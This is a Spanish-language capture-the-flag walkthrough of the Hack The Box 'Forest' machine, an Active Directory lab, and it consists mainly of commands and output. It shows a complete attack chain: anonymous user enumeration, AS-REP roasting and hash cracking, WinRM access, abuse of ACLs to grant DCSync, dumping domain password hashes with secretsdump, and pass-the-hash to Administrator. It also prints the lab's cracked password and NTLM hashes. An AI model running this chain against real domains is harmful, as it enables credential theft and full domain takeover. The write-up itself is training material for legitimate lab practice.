# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.25.66
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49998
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-08 18:34:49Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49683/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
49998/tcp open  msrpc        Microsoft Windows RPC
| smb2-time: 
|   date: 2025-04-08T18:35:43
|_  start_date: 2025-04-08T17:50:21
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-04-08T11:35:42-07:00
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m49s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.25.66                                             
SMB         10.129.25.66    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo '10.129.25.66 htb.local' >> /etc/hosts
```

>Si nos conectamos por RPC de forma anónima podemos enumerar los usuarios del dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ rpcclient -U "" -N 10.129.25.66   
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

>Vamos a meterlos en un archivo y tratar el texto para quedarnos solo con los usuarios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ cat users | awk '{print $2}' FS=":" | awk '{print $1}' FS=" " | tr -d '[]' > valid_users
```

>Teniendo esta lista, vamos a comprobar si son válidos con kerbrute:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ kerbrute userenum --dc 10.129.25.66 -v valid_users -d HTB.LOCAL

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/08/25 - Ronnie Flathers @ropnop

2025/04/08 14:34:46 >  Using KDC(s):
2025/04/08 14:34:46 >   10.129.25.66:88

2025/04/08 14:34:46 >  [+] VALID USERNAME:       Administrator@HTB.LOCAL
<SNIP>
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailboxfc9daad@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailboxc0a90c9@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox6ded678@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox968e74d@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox670628e@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox83d6781@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailboxb01ac64@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailboxfd87238@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       sebastien@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox7108a4e@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       HealthMailbox0659cc1@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       lucinda@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       mark@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       andy@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       svc-alfresco@HTB.LOCAL
2025/04/08 14:34:46 >  [+] VALID USERNAME:       santi@HTB.LOCAL
2025/04/08 14:34:46 >  Done! Tested 31 usernames (18 valid) in 0.248 seconds
```

>Vamos a realizar un ataque ASREP-ROAST para intentar obtener el hash de alguno de estos usuarios y vemos que obtenemos uno del usuario svc_alfresco:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ impacket-GetNPUsers -no-pass -usersfile valid_users htb.local/ 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<SNIP>

$krb5asrep$23$svc-alfresco@HTB.LOCAL:fb7f68e30e5957aa006b0a4d427688a9$a7ec169edefd9abb3dc46795d890a3d2de51186ab3e489b2f6af33fa3d28e8950316e8e0f06c6f25402e2456e5899e82eeed4a21e65b3437fb1364d2584fcd2e0ada90e23a50a31e703e1f3f5327832ab95821730a285ebc0253604a95e7f1a4486ac7e6849e6e23366372bfca0a6ce1a0cbfec8360dd75763112d5df1fc5a3b1be0b51e201f53dff6476f2fbacc72145001a8d39a90f8a2b44ee9db3b581b5ecdecb388f705b0d53bda133634598593bfcb28cfb3f588a194861e9f5177480e112a66d3da48ec303c2dffaaa7841b3baf1e37517abde6fadb995e5e49f0696cbd8a6b2b518b
<SNIP>
```

>Vamos a crackearlo offline para obtener la contraseña del usuario empleando hashcat con la máscara 18200 que corresponde a los hashes ASREP de tipo 23 (`$krb5asrep$23$`):

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5asrep$23$svc-alfresco@HTB.LOCAL:fb7f68e30e5957aa006b0a4d427688a9$a7ec169edefd9abb3dc46795d890a3d2de51186ab3e489b2f6af33fa3d28e8950316e8e0f06c6f25402e2456e5899e82eeed4a21e65b3437fb1364d2584fcd2e0ada90e23a50a31e703e1f3f5327832ab95821730a285ebc0253604a95e7f1a4486ac7e6849e6e23366372bfca0a6ce1a0cbfec8360dd75763112d5df1fc5a3b1be0b51e201f53dff6476f2fbacc72145001a8d39a90f8a2b44ee9db3b581b5ecdecb388f705b0d53bda133634598593bfcb28cfb3f588a194861e9f5177480e112a66d3da48ec303c2dffaaa7841b3baf1e37517abde6fadb995e5e49f0696cbd8a6b2b518b:s3rvice
```

>Vamos a comprobar las credenciales mediante crackmapexec, por lo que podemos ver son válidas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ crackmapexec smb 10.129.25.66 -u 'svc-alfresco' -p 's3rvice'
SMB         10.129.25.66    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.25.66    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```

> Vemos que no hay ningún usuario Kerberoasteable:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ impacket-GetUserSPNs -dc-ip 10.129.25.66 htb.local/svc-alfresco:s3rvice -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

>Vamos a realizar un dumpeo del dominio mediante LDAP empleando la herramienta ldapdomaindump:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.25.66                                                       
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

>Abrimos un servidor web en el directorio en el que se crearon los archivos y los vemos mediante el navegador.

>Aquí podremos ver que el usuario svc-alfresco pertenece al grupo Service Accounts que este grupo pertenece al grupo Privileged IT Accounts y que este grupo a su vez pertenece al grupo de Remote Management Users por lo que podemos conectarnos con evil-winrm a la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ evil-winrm -u 'htb.local\svc-alfresco' -p 's3rvice' -i 10.129.25.66
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```

>Aquí podemos ver el users.txt:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/8/2025  10:51 AM             34 user.txt
```

# Privilege Escalation

>Ahora, ejecutaremos bloodhound-python para obtener datos que analizar en BloodHound del dominio para ver por donde podríamos escalar privilegios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.129.25.66 -d htb.local -c all
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 18S

```

>Vamos a comprimir los archivos resultantes del comando anterior en un zip para facilitar el importado a BloodHound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ zip forest.zip 2025*
  adding: 20250408150238_computers.json (deflated 83%)
  adding: 20250408150238_containers.json (deflated 93%)
  adding: 20250408150238_domains.json (deflated 77%)
  adding: 20250408150238_gpos.json (deflated 82%)
  adding: 20250408150238_groups.json (deflated 95%)
  adding: 20250408150238_ous.json (deflated 93%)
  adding: 20250408150238_users.json (deflated 96%)
```

>Ahora iniciamos el servicio de Neo4j, la base de datos que emplea bloodhound:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ sudo neo4j start
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:72155). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

>Abrimos bloodhound de forma gráfica, nos logueamos con las credenciales de Neo4j e importamos el archivo zip, si da error de formato JSON, importar el zip arrastrándolo desde una carpeta a la aplicación:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest]
└─$ bloodhound &>/dev/null & disown                                                      
[1] 72791
```

>Aquí podemos ver que nuestro usuario tiene permisos GenericAll sobre el grupo Exchange Windows Permissions:

![image](https://github.com/user-attachments/assets/f07b40ee-8265-4d9f-a0ae-6d44d4ae0ead)


>Este grupo tiene permisos de WriteDacl sobre el dominio por lo que podríamos explotarlo:

![image](https://github.com/user-attachments/assets/86f662f2-08f0-4850-96fc-9a374008df6b)


>El permiso GenericAll puede ser abusado para unirnos al grupo que deseemos, en este caso "Exchange Windows Permissions" :

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" svc-alfresco /add /domain
The command completed successfully.
```

>Ahora que pertenecemos a este grupo tenemos permisos WriteDacl sobre el dominio.

>Este permiso puede ser abusado para agregarle permisos de DCSync a un usuario de la siguiente forma, pero primero necesitaremos subir PowerView.ps1 e importarlo:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload /home/kali/Desktop/machines/forest/PowerView.ps1
                                        
Info: Uploading /home/kali/Desktop/machines/forest/PowerView.ps1 to C:\Users\svc-alfresco\Desktop\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Import-Module .\PowerView.ps1
```

>Preparamos las credenciales de svc-alfresco:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
```

>Le agregamos permisos de DCSync al usuario:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

>Pero no funcionará, ya que nos saca del grupo, por lo que deberemos juntar todo en un one-liner para que no le de tiempo al sistema de sacarnos del grupo:

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

>Para aprovecharnos de estos nuevos permisos vamos a emplear la herramienta de impacket secretsdump para realizar un DCSync:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest/aclpwn.py]
└─$ impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.25.66
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>
```

>Ahora haremos un PassTheHash para conectarnos al sistema como el usuario administrador y obtener la root.txt flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/forest/aclpwn.py]
└─$ evil-winrm -i 10.129.25.66 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/8/2025  10:51 AM             34 root.txt
```
